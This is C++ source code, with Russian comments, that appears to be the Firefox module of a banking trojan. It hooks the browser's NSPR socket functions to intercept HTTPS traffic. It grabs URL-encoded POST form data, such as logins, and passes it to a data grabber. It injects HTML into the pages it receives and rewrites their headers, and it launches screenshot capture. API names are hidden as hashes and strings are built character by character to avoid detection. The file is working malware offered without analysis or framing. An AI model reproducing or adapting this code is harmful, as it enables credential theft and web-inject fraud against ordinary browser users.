#include <windows.h>

#include <nss/ssl.h>
#include <nspr/prio.h>
#include <nspr/prnetdb.h>
#include <nspr/prlog.h>
#include <nspr/prerror.h>
#include <nspr/prprf.h>
#include <nspr/prinit.h>
#include <nspr/prtypes.h>

#include "GetApi.h"
#include "Memory.h"
#include "Strings.h"
#include "Utils.h"
#include "Exploit.h"
#include "Splice.h"
#include "Unhook.h"
#include "Loader.h"
#include "Screens.h"
#include "Requests.h"
#include "BotHTTP.h"
#include "BotClasses.h"
#include "Firefox.h"

#include "Modules.h"

//#include "BotDebug.h"

// Зарезервируем имя для объявления функций nspr4 апи
#define NSPRAPI


// Для избежания затрат процесорного времени при поиске функций в загруженных
// библиотеках кешируем найденные результаты
const DWORD ApiCasheSize = 6;
LPVOID ApiCashe[ApiCasheSize] = {NULL};

bool InitMozillaApiCashe()
{
	// Инициализировать кэш апи
	m_memset(&ApiCashe, 0, ApiCasheSize * sizeof(DWORD));
	return true;
}

/* Шаблоны для доступа к API */

// Шаблон для инициализации функций без параметров
template <DWORD ApiIndex, DWORD h, DWORD hash>
inline LPVOID pushargEx2()
{
	typedef LPVOID (NSPRAPI (*newfunc))();
	newfunc func = (newfunc)ApiCashe[ApiIndex];
	if (func == NULL)
	{
		func = (newfunc)GetProcAddressEx(NULL, h, hash);
		ApiCashe[ApiIndex] = (LPVOID)func;
	}
	return func();
}

// Шаблон для инициализации функций с одним параметром
template <DWORD ApiIndex, DWORD h, DWORD hash, class A>
inline LPVOID pushargEx2(A a1)
{
	typedef LPVOID (NSPRAPI *newfunc)(A);
	newfunc func = (newfunc)ApiCashe[ApiIndex];
	if (func == NULL)
	{
		func = (newfunc)GetProcAddressEx(NULL, h, hash);
		ApiCashe[ApiIndex] = (LPVOID)func;
	}
	return func(a1);
}

// Шаблон для инициализации функций с двумя парaметрами
template <DWORD ApiIndex, DWORD h, DWORD hash, class A, class B>
inline LPVOID pushargEx2(A a1, B b1)
{
	typedef LPVOID (NSPRAPI *newfunc)(A, B);
	newfunc func = (newfunc)ApiCashe[ApiIndex];
	if (func == NULL)
	{
		func = (newfunc)GetProcAddressEx(NULL, h, hash);
		ApiCashe[ApiIndex] = (LPVOID)func;
	}
	return func(a1, b1);
}

// Шаблон для инициализации функций с тремя парaметрами
template <DWORD ApiIndex, DWORD h, DWORD hash, class A, class B, class C>
inline LPVOID pushargEx2(A a1, B b1, C c1)
{
	typedef LPVOID (NSPRAPI *newfunc)(A, B, C);
	newfunc func = (newfunc)ApiCashe[ApiIndex];
	if (func == NULL)
	{
		func = (newfunc)GetProcAddressEx(NULL, h, hash);
		ApiCashe[ApiIndex] = (LPVOID)func;
	}
	return func(a1, b1, c1);
}

// Шаблон для инициализации функций с пятью парaметрами
template <DWORD ApiIndex, DWORD h, DWORD hash, class A, class B, class C, class D, class E>
inline LPVOID pushargEx2(A a1, B b1, C c1, D d1, E e1)
{
	typedef LPVOID (NSPRAPI *newfunc)(A, B, C, D, E);
	newfunc func = (newfunc)ApiCashe[ApiIndex];
	if (func == NULL)
	{
		func = (newfunc)GetProcAddressEx(NULL, h, hash);
		ApiCashe[ApiIndex] = (LPVOID)func;
	}
	return func(a1, b1, c1, d1, e1);
}

// Описываем функции для работы с библиотекой NSPR4;
#define pPR_GetError				pushargEx2<0, 10, 0x1D3347F>
#define pPR_MillisecondsToInterval	pushargEx2<1, 10, 0x5BF9111>
#define pPR_Poll					pushargEx2<2, 10, 0xFA1AB4F9>
#define pPR_SetError				pushargEx2<3, 10, 0x1FB347F>
#define pPR_Recv     				pushargEx2<4, 10, 0xFA583363>
#define pPR_GetNameForIdentity		pushargEx2<5, 10, 0xF135BB8C>

//#define pPR_GetOSError				pushargEx<10,0xBEBFDE8D>
//#define pPR_ErrorToName				pushargEx<10,0xE2C4D38>
//#define pPR_Available				pushargEx<10,0xDDF2584>
//#define pPR_GetConnectStatus		pushargEx<10,0xA4989C58>


// Шаблон вывода отладочного сообщения FireFox
template <class REQUEST, class DATA, class STR_>
void FFBG_Template(REQUEST Request, DATA Data, STR_ Str)
{
	#ifdef DebugUtils
		PCHAR Section = StrLongToString((DWORD)Request);
		Debug::MessageEx("FireFox", 0, Section, (PCHAR)Data, (PCHAR)Str);
		STR::Free(Section);
	#endif
}

template <class REQUEST, class DATA, class STR_, class ARG1>
void FFBG_Template(REQUEST Request, DATA Data, STR_ Str, ARG1 Arg)
{
	#ifdef DebugUtils
		PCHAR Section = StrLongToString((DWORD)Request);
		Debug::MessageEx("FireFox", 0, Section, (PCHAR)Data, (PCHAR)Str, Arg);
		STR::Free(Section);
	#endif
}

template <class REQUEST, class DATA, class STR_, class ARG1, class ARG2>
void FFBG_Template(REQUEST Request, DATA Data, STR_ Str, ARG1 Arg, ARG2 Arg2)
{
	#ifdef DebugUtils
		PCHAR Section = StrLongToString((DWORD)Request);
		Debug::MessageEx("FireFox", 0, Section, (PCHAR)Data, (PCHAR)Str, Arg, Arg2);
		STR::Free(Section);
	#endif
}

#define FFDBG FFBG_Template<>



/* Описания констант */
char HeaderContentLength[] = {'c','o','n','t','e','n','t','-','l','e','n','g','t','h',':',' ',0};


typedef PRInt32 (*PWRITE)( PRFileDesc *fd,const void *buf,PRInt32 amount ); 
typedef PRInt32 (*PREAD)(PRFileDesc *fd, void *buf, PRInt32 amount);
typedef PRStatus (*PCLOSE)( PRFileDesc *fd );
typedef PRStatus (*PCONNECT)( PRFileDesc *fd, const PRNetAddr *addr, PRIntervalTime timeout );
typedef PRFileDesc * (*PSSLIMPORTFD)( PRFileDesc *model, PRFileDesc *fd );
typedef void *(NSPRAPI *PROpenTCPSocket)(int af);

PREAD		PR_ReadReal;
PWRITE		PR_WriteReal;
PCLOSE		PR_CloseReal;
PCONNECT	PR_ConnectReal;
PSSLIMPORTFD SSL_ImportFDReal;
PROpenTCPSocket PR_OpenTCPSocketReal;


//     Глобальные данные
PList HashList = NULL;
PCHAR FFUserAgent;
PRequestList FFRequests = NULL;

//-----------------------


void InitFFGlobalData()
{
	InitMozillaApiCashe();
	FFRequests = Request::CreateList(NULL, NULL);
	HashList = List::Create();
	FFUserAgent = NULL;
}

LPDWORD dwHashPosts;
DWORD dwHashCount;

void AddHash(DWORD Hash)
{
	List::Add(HashList, (LPVOID)Hash);
}

bool FindHash(DWORD Hash)
{
	return List::IndexOf(HashList, (LPVOID)Hash) >= 0;
}

//----------------------------------------------------------------------------


namespace FFUtils
{
	//---------------------------------------------------------------------------

	bool CheckDocumentCompleted(PRequest Request)
	{
		// Функция проверяет возвращает истину если документ полностью загружен
		if (Request->FileReaded) return true;

		// Проверяем длину загруженных данных.
		if (Request->ContentLength != 0)
		{
//			DWORD Size = MEMBLOCK::Size(Request->ReceiveList);
			Request->FileReaded = (Request->ReadedSize >= (Request->HeaderSize + Request->ContentLength));
		}

		return Request->FileReaded;
	}

	//---------------------------------------------------------------------------
	bool ProcessResponseHeaders(PRequest Request)
	{
		// Функция обрабатывает загруженный заголовок

		PMemBlock Block = MEMBLOCK::Pack(Request->ReceiveList);
		if (Block == NULL || Block->Size == 0) return false;

		PCHAR Buf = (PCHAR)Block->Data;
		// Определяем размер заголовка
		int HeadSize = STR::Pos(Buf, LineBreak2, Block->Size);
		if (HeadSize < 0) return false;


		#ifdef DebugUtils
			PCHAR Tmp = STR::New(Buf, HeadSize);
			FFDBG(Request, Tmp, "Обрабатываем ответ сервера:");
            STR::Free(Tmp);
		#endif

		HeadSize += 4;
        Request->HeaderSize = HeadSize;

		// Проверяем тип контекста
		#ifdef HTMLInjectsH
			Request->ContentType = HTTPParser::GetHeaderValue(Buf, ParamContentType);
			FFDBG(Request, NULL, "--- Тип документа [%s]", Request->ContentType);

			bool Support = HTMLInjects::SupportContentType(Request->ContentType);
			if (!Support)
			{
				FFDBG(Request, NULL, "---err Данный тип документов не поддерживается");
				Request->IsInject = false;
				return true;
			}
		#endif

		// Определяем длину контента
		PCHAR CL = HTTPParser::GetHeaderValue(Buf, ParamContentLength);
		if (CL != NULL)
		{
			Request->ContentLength = StrToInt(CL);
			if (Request->ContentLength == 0)
				Request->IsInject = false;
			FFDBG(Request, NULL, "--- Размер документа %d", Request->ContentLength);
			STR::Free(CL);
		}
		else
			FFDBG(Request, NULL, "---err Не указан размер документа");

		// Для инжекта допускаем только страницы с положительной длиной контента
	//	if (Request->ContentLength == 0)
	//		Request->IsInject = false;

		return true;
	}
	//----------------------------------------------------------------------------


	void UpdateContentLength(PRequest Request)
	{
		// Обновить длину контента
		PCHAR Buf = (PCHAR)Request->Buffer;

		// Определяем позицию вставки
		int Pos = STR::Pos(Buf, ParamContentLength);
		if (Pos < 0) return;
		Pos += StrCalcLength(ParamContentLength);

		// Определяем новый размер
		Request->ContentLength = StrCalcLength(Buf + Request->HeaderSize);

		PCHAR BufEnd = Buf + (Request->HeaderSize + Request->ContentLength);

		// Создаём строку
		PCHAR CLS = StrLongToString(Request->ContentLength);
		PCHAR InLine = STR::New(2, ": ", CLS);
		DWORD InLineLen = StrCalcLength(InLine);
		STR::Free(CLS);

		// Определяем указатели на копируемые блоки
		PCHAR AfterPtr = Buf + Pos;
		while (*AfterPtr != 10 && *AfterPtr != 13) AfterPtr++;

		// Определяем общий размер буфера
		DWORD Len = Pos + InLineLen + (BufEnd - AfterPtr);

		PCHAR NewBuf = (PCHAR)MemAlloc(Len + 1);
		if (NewBuf == NULL) return;

		// Копируем данные
		PCHAR Tmp = NewBuf;

		m_memcpy(Tmp, Buf, Pos);
		Tmp += Pos;

		m_memcpy(Tmp, InLine, InLineLen);
		Tmp += InLineLen;
		STR::Free(InLine);

		m_memcpy(Tmp, AfterPtr, BufEnd - AfterPtr);

		*(NewBuf + Len) = 0;

		// Устанавливаем новый буяер
		Request::SetBuffer(Request, (LPBYTE)NewBuf, Len);
	}
	//----------------------------------------------------------------------------

}
//----------------------------------------------------------------------------

#ifdef HTMLInjectsH
	bool InjectFF(PRequest Request)
	{
		// Обрабатываем загруженные данные
		if (Request == NULL || !Request->IsInject)
			return false;

		FFDBG(Request, NULL, "+++++  Производим HTML инжекты");

		Request->Injected = true;

		THTTPSessionInfo Session; // Описание сессии

		Session.BrowserType = BROWSER_TYPE_FF;
		Session.UserAgent = FFUserAgent;
		Session.URL = Request->URL;

		Request->Injected = true;
		if (HTMLInjects::Execute(Request, &Session))
		{
			FFUtils::UpdateContentLength(Request);
			FFDBG(Request, NULL, "+++++  В документ внесены изменения");
			return true;
		}

		return false;
	}
#endif

bool SubstituteHeader(char *Header)
{
	char gzip_deflate[] = {'g','z','i','p',',','d','e','f','l','a','t','e',0};

	DWORD dwStart = m_istrstr( Header, gzip_deflate );

	if ( dwStart != (DWORD)-1 )
	{
		for ( DWORD i = 0; i < m_lstrlen( gzip_deflate ); i++ )
		{
			Header[ dwStart + i ] = ' ';
		}
	}

	char Http[] = {'H','T','T','P','/','1','.',0};

	DWORD dwHttp = m_istrstr( Header, Http );

	if ( dwHttp != (DWORD)-1 )
	{
		Header[ dwHttp + m_lstrlen( Http ) ] = '0';
		return true;
	}

	return TRUE;
}

//----------------------------------------------------------------------------
void UpdateFFUserAgent(PCHAR Request)
{
    // Получаем имя агента
	if (FFUserAgent == NULL)
    	FFUserAgent = HTTPParser::GetHeaderValue(Request, ParamUserAgent);
}

//----------------------------------------------------------------------------

bool ProcessPostData(PRequest Request)
{
	// Обработать POST данные

	// Проверяем библиотеку ScreenShot
	if ( CalcHash(Request->Optional) == 0x24DE3210 )
	{
		FFDBG(Request, NULL, "Обрабатываем скриншоты");
		StartThread( ScreensThread, NULL );
		return true;
	}

	// Проверяем не обрабатывали ли мы этот запрос
	FFDBG(Request, NULL, "Получаем хэш");
	DWORD DataHash = CalcHash(Request->Optional);
	if (FindHash(DataHash))
		return true;

	FFDBG(Request, NULL, "Отправляем данные");

	DataGrabber::AddHTMLFormData(Request->URL, Request->Optional, FFUserAgent, BROWSER_TYPE_FF, DATA_TYPE_FORM);

	AddHash(DataHash);

	return true;
}
//----------------------------------------------------------------------------


bool MakeInfo( PRequest Request, PCHAR buf, int len )
{

	// Собираем информацию об отправляемом запросе

	PCHAR MethodName;
	PCHAR Path;

	DWORD ConentTypeHash = 0x6B3CDFEC;

	if (ParseRequestFirstLine(buf, &MethodName, &Path, NULL))
	{
		Request::Clear(Request);

		UpdateFFUserAgent(buf);

		// Разбираем тип запроса
		Request->Method = GetMethodFromStr(MethodName);
		STR::Free(MethodName);

		if (Request->Method != hmGET && Request->Method != hmPOST)
		{
			STR::Free(Path);
			return false;
		}

		// Собираем URL
		PCHAR Host = HTTPParser::GetHeaderValue(buf, ParamHost);
		PCHAR Protocol = ProtocolHTTP;
		PRFileDesc *FD = (PRFileDesc *)Request->Owner;
		if (FD->identity > 0)
		{
			PCHAR Scheme = (PCHAR)pPR_GetNameForIdentity(FD->identity);

			if (StrSame(Scheme, "NSS layer", false, 9))
				Protocol = ProtocolHTTPS;
        }

		Request->URL = STR::New(5, Protocol, "://", Host, "/", Path);
		STR::Free(Path);
		STR::Free(Host);
		if (Request->URL == NULL) return false;

		if (Request->Method == hmGET)
			return true;


		// Подготавливаем запрос к перехвату пост данных
		Request->SupportPostData = true;

		FFDBG(Request, Request->Optional, "Перехватываем POST данные");

		if (STR::Pos(buf, LineBreak2, len) < 0)
		{
			FFDBG(Request, Request->Optional, "Запрос не содержит POST данные");
			return false;  // В заголовке нет пост данных
		}




		// Проверяем тип контента
		PCHAR CT = HTTPParser::GetHeaderValue(buf, ParamContentType);
		DWORD Hash = CalcHash(CT);
		FFDBG(Request, Request->Optional, "Content-Type: %s", CT);
		STR::Free(CT);
		if (Hash != ConentTypeHash) /* url_encoded*/
		{
			FFDBG(Request, Request->Optional, "Тип данных не поддерживается", CT);
			Request->SupportPostData = false;
			return true;
		}



		Request->Optional = GetURLEncodedPostData(buf);

		#ifndef BV_APP
		FFDBG(Request, NULL, "POST данные: \r\n\r\n %s \r\n\r\n", Request->Optional);
		#endif


		if (Request->Optional != NULL)
		{
			// запрос содержит пост данные, обрабатываем их
			ProcessPostData(Request);
		}
		return true;
	}
	else
	if (Request->Method == hmPOST && Request->SupportPostData)
	{
		// Проверяем POST данные

		bool RequestEnd = STR::Pos(buf, LineBreak2) >= 0; // Признак наличия окончания запроса

        // Проверяем тип контента
		PCHAR CT = HTTPParser::GetHeaderValue(buf, ParamContentType);
		if (CT != NULL)
		{
			DWORD Hash = CalcHash(CT);
			STR::Free(CT);
			if (Hash != ConentTypeHash) /* url_encoded*/
			{
                Request->SupportPostData = false;
				return true;
			}
		}

		if (Request->Flags != 0)
		{
			Request->Optional = STR::New(buf, len);
			ProcessPostData(Request);
			return true;
		}
		else
		{
			// Наличие признака окончания запроса означает, что браузер
			// полностью вызал заголовок и следующей записью будут
			// выданы пост данные
			if (RequestEnd)
				Request->Flags = 1;
        }
	}
	return false;
}
//---------------------------------------------------------------------------

/*
bool WaitPool(PRFileDesc *FD)
{
	// Функция будет ожидать пока производится запись в пул
	bool Result = false;
	PRInt32 npoll;
	PRIntervalTime delay = (PRIntervalTime)pPR_MillisecondsToInterval(50);

	PRPollDesc *pfd = CreateStruct(PRPollDesc);

	while (1)
	{
		pfd->fd		 = FD;
		pfd->out_flags = 0;
		pfd->in_flags  = PR_POLL_READ;

		npoll = (PRInt32)pPR_Poll(pfd, 1, delay );
		PRInt32 OutFlags = pfd ->out_flags;

		if (npoll > 0)
		{
			if (OutFlags & PR_POLL_READ )
				Result = true;
		}
		else
			break;
	}

	FreeStruct(pfd);
    return Result;

}  */
//---------------------------------------------------------------------------

DWORD ReadSocketData(PRequest Request, LPVOID Buf, int BufSize)
{
	// Читаем данные из сокета
	if (Request->FileReaded) return 0;

	if (!Request->FileReaded && Request->ReceiveList == NULL)
	{
		Request::InitializeReceiveData(Request);
		FFDBG(Request, NULL, "Начало чтения данных");
    }

	PMemBlockList List = Request->ReceiveList;

	DWORD Readed = 0;
	PRInt32 Bytes = 0;
	PRFileDesc *FD = (PRFileDesc *)Request->Owner;

	do
	{
		// Читаем следующую порцию данных
		//Bytes = (PRInt32)PR_ReadReal(FD, Request->ReceiveBuf->Data, Request->ReceiveBuf->Size);
		Bytes = (PRInt32)PR_ReadReal(FD, Buf, BufSize);

		if (Bytes <= 0) break;

		// Успешно прочитали порцию данных
		FFDBG(Request, NULL, "---> Прочитано %d байт", Bytes);
		Readed += Bytes;
		Request->ReadedSize += Bytes;

		//MEMBLOCK::AddBlock(List, Request->ReceiveBuf->Data, Bytes);
		MEMBLOCK::AddBlock(List, Buf, Bytes);

		// Обрабатываем заголовок ответа сервера
		if (!Request->HeaderHandled)
		{
			Request->HeaderHandled = FFUtils::ProcessResponseHeaders(Request);
			if (!Request->IsInject)
				break;
		}

		FFUtils::CheckDocumentCompleted(Request);
		if (Request->FileReaded) break;
	}
	while (1);

	if (Bytes == 0)
	{
		FFDBG(Request, NULL, "Соединение с сокетом закрыто");
		Request->FileReaded = true;
		Request->ConnectionClosed = true;
    }

	// Собираем загруженные данные
	if (!Request->IsInject || Request->FileReaded)
		Request::CloseReceiveData(Request);

	return Readed;
}
//---------------------------------------------------------------------------

PRInt32 FFInjectedRead(PRequest Request, void* buf, PRInt32 amount)
{
	// Читаем следующий блок данных

	// Читаем порцию данных
	ReadSocketData(Request, buf, amount);

	if (!Request->IsInject)
		return Request::GetNextDataPart(Request, buf, amount, true);

	if (!Request->FileReaded)
	{
		pPR_SetError(PR_WOULD_BLOCK_ERROR, 0);
		return -1;
	}



	 DWORD Bytes = 0;

	// Инжектим данные в загруженный документ
	#ifdef HTMLInjectsH
		if (!Request->Injected)
			InjectFF(Request);
	#endif

	// Выдаём следующий блок данных
	Bytes = Request::GetNextDataPart(Request, buf, amount, true);

	if (Bytes != 0)
		FFDBG(Request, NULL, "<--- Возвращаем %d байт", Bytes);
	else
		FFDBG(Request, NULL, "Все данные переданы");

	return Bytes;
}
//-----------------------------------------------------------------------------

PRInt32 PR_ReadHook(PRFileDesc *fd, void* buf, PRInt32 amount )
{

	PRequest Request = Request::Find(FFRequests, fd);

	int Bytes;

	// Вызываем оригинальный метод чтения
	if ( Request == NULL  || !Request->IsInject)
	{
		// Возможна ситуация когда запрос помечен ка запрос не поддерживающий
		// инжекты, но содержит некоторые загруженные данные
		if (Request != NULL && Request->Buffer != NULL)
		{
			Bytes = Request::GetNextDataPart(Request, buf, amount, true);
			if (Bytes > 0 || Request->ConnectionClosed)
				return Bytes;
		}

		Bytes = PR_ReadReal(fd, buf, amount);
    }
	else
	{
		Bytes = FFInjectedRead(Request, buf, amount);
		if (Bytes == 0 && !Request->ConnectionClosed)
			Bytes = PR_ReadReal(fd, buf, amount);
	}

	return Bytes;

}
//---------------------------------------------------------------------------

PRInt32 PR_WriteHook(PRFileDesc *fd, const void* buf, PRInt32 amount )
{
	//  Метод отправки данных на сервер
	PRequest Request = Request::Find(FFRequests, fd);
	if ( Request != NULL )
	{

		FFDBG(Request, (PCHAR)buf, "Отправка запроса на %s", Request->URL);

		#ifndef BV_APP
			FFDBG(Request, NULL, "\r\n\r\n(Размер буфера %d)\r\n", amount);
			FFDBG(Request, NULL, (PCHAR)buf);
			FFDBG(Request, NULL, "\r\n\r\n");
		#endif

		if (MakeInfo(Request, (PCHAR)buf, (int)amount ) )
		{
			#ifdef HTMLInjectsH
				if (Config::GetInjectsForRequest(Request))
				{
					SubstituteHeader((PCHAR)buf);

					FFDBG(Request, (PCHAR)buf, "   >>>>>> Inject URL=%s", Request->URL);
				}
            #endif
		}
	}

	return PR_WriteReal(fd, buf, amount);
}
//---------------------------------------------------------------------------


PRStatus PR_CloseHook(PRFileDesc *fd)
{
//	PRStatus Status = PR_CloseReal(fd);
	DWORD Res = Request::Delete(FFRequests, fd);
	if (Res != 0)
	{
		FFDBG(Res, NULL, "\r\n==============  Соединение закрыто \r\n");
	}

	return PR_CloseReal(fd);
}

/*
PRStatus PR_ConnectHook( PRFileDesc *fd, const PRNetAddr *addr, PRIntervalTime timeout )
{
	PRequest Request = Request::Add(FFRequests, fd);
    #ifdef DebugUtils
		Debug::MessageEx("FireFox", (DWORD)fd, "Connect", NULL, "R=%d", Request);
    #endif

	return PR_ConnectReal( fd, addr, timeout );
}



PRFileDesc * SSL_ImportFDHook( PRFileDesc *model, PRFileDesc *fd )
{
	PRFileDesc *SslFd = SSL_ImportFDReal(model, fd);

	if ( SslFd != NULL )
	{
		PRequest Request = Request::Add(FFRequests, SslFd);

		#ifdef DebugUtils
			Debug::MessageEx("FireFox", (DWORD)fd, "SSL Import", NULL, "R=%d", Request);
		#endif


		if ( Request != NULL )
			Request->HTTPS = true;
	}

	return SslFd;
}  */

LPVOID NSPRAPI PR_OpenTCPSocketHook(int af)
{
	LPVOID FD = PR_OpenTCPSocketReal(af);

	if (FD != NULL)
	{
		PRequest R = Request::Add(FFRequests, FD);
		FFDBG(R, NULL, "Открываем сокет");
	}

	return FD;
}


bool WINAPI CheckInCurrentDir( WCHAR *File )
{
	WCHAR *Directory = (WCHAR*)MemAlloc( 512 );

	if ( Directory == NULL )
	{
		return false;
	}

	pGetModuleFileNameW( (HMODULE)pGetModuleHandleW( NULL ), Directory, 255 );

	for ( DWORD i = m_wcslen( Directory ) - 1; i > 0; i-- )
	{
		if ( Directory[i] == '\\' )
		{
			Directory[i + 1] = '\0';
			break;
		}
	}

	plstrcatW( Directory, File );

	if ( (DWORD)pGetFileAttributesW( Directory ) != INVALID_FILE_ATTRIBUTES)
	{
		MemFree( Directory );
		return true;
	}

	MemFree( Directory );
	return false;
}


bool HookMozillaFirefox()
{
	WCHAR nspr4[] = {'n','s','p','r','4','.','d','l','l',0};
	WCHAR ssl3[]  = {'s','s','l','3','.','d','l','l', 0 };

	if (CheckInCurrentDir( nspr4 ) && CheckInCurrentDir( ssl3 ) )
	{
		//UnhookFF();
		#ifdef HTMLInjectsH
			Config::Initialize(NULL, true, false);
		#endif

		//InitScreenLib();

		return NSPRHOOKS::HookNSPRApi();
	}

	return false;
}

bool NSPRHOOKS::HookNSPRApi()
{

	InitFFGlobalData();

	dwHashPosts = NULL;
	dwHashCount = 0;

	DWORD PR_OpenTCPSocketHash = 0x54030857;
	DWORD PR_WriteHash	   = 0x7EFB3098;
	DWORD PR_ReadHash	   = 0xFA583271;
	DWORD PR_CloseHash	   = 0x3D3AB319;
	DWORD PR_ConnectHash   = 0xBF667EA2;
	DWORD SSL_ImportFDHash = 0xA1C4E024;

	if ( HookApi( 10, PR_OpenTCPSocketHash, (DWORD)&PR_OpenTCPSocketHook))
	{
	   __asm mov [PR_OpenTCPSocketReal], eax
	}
	else
		return false;

	if ( HookApi( 10, PR_CloseHash, (DWORD)&PR_CloseHook ) )
	{
	   __asm mov [ PR_CloseReal ], eax
	}
	else
		return false;

//	if ( HookApi( 10, PR_ConnectHash, (DWORD)&PR_ConnectHook ) )
//	{
//	   __asm mov [ PR_ConnectReal ], eax
//	}
//	else
//		return false;

	if ( HookApi( 10, PR_WriteHash, (DWORD)&PR_WriteHook ) )
	{
		__asm mov [ PR_WriteReal ], eax
	}
	else
		return false;


	if ( HookApi( 10, PR_ReadHash, (DWORD)&PR_ReadHook ) )
	{
		__asm mov [ PR_ReadReal ], eax
	}
	else
		return false;


//	if ( HookApi( 11, SSL_ImportFDHash, (DWORD)&SSL_ImportFDHook ) )
//	{
//	   __asm mov [ SSL_ImportFDReal ], eax
//	}
//	else
//		return false;

	return true;
}


PRequestList NSPRHOOKS::GetRequests()
{
    return FFRequests;
}
